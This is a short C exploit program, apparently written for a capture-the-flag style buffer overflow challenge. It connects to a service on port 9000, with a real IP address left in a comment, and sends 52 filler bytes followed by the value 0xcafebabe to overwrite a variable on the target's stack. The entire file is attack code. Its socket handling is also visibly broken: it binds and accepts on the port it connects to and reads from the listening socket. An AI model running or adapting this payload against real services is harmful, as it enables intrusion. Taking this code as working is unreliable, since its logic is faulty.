#include <sys/socket.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <string.h>

int	pressed = 0;

void	die(char *str)
{
	printf("%s\n", str);
	exit(-1);
}

void	exploit(int sockfd, struct sockaddr_in *local)
{
	char	c;
	int		i;
	char	exp[58];
	char	buff[100];
	int		len;
	struct sockaddr_in	cli;
	int		connfd;
	int		listen_sock;

	i = 0;
	while (i < 52)
		exp[i++] = 'A';
	exp[i++] = 0xbe;
	exp[i++] = 0xba;
	exp[i++] = 0xfe;
	exp[i++] = 0xca;
	exp[i++] = '\n';
	exp[i] = '\0';
	bzero(&buff, 1);
	listen_sock = socket(AF_INET, SOCK_STREAM, 0);
	if (listen_sock == -1)
		die("error createing listening socket");
	if (bind(listen_sock, (struct sockaddr *)local, sizeof(*local)) != 0)
		die("socket bind failed");
	if (listen(listen_sock, 5) != 0)
		die("Listen failed");
	len = sizeof(cli);
	connfd = accept(listen_sock, (struct sockaddr *)&cli, &len);
	if (connfd < 0)
		die("Accepting error");
	write(sockfd, &exp, strlen(exp));
	sleep(3);
	read(listen_sock, &buff, sizeof(buff));
	printf("%s\n", buff);
}

int	main()
{
	int					sockfd;
	struct sockaddr_in	servaddr;
	struct sockaddr_in	local;
	int					addr_size;

	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd < 0)
		die("Error opening socket");
	bzero(&servaddr, sizeof(servaddr));
	servaddr.sin_family = AF_INET;
	// servaddr.sin_addr.s_addr = inet_addr("128.61.240.205");
	servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
	servaddr.sin_port = htons(9000);
	bzero(&local, sizeof(local));
	local.sin_family = AF_INET;
	// local.sin_addr.s_addr = inet_addr("128.61.240.205");
	local.sin_addr.s_addr = htonl(INADDR_ANY);
	local.sin_port = htons(9000);
	if (connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) != 0)
		die("Can't establish connection");
	exploit(sockfd, &local);
	close(sockfd);
}
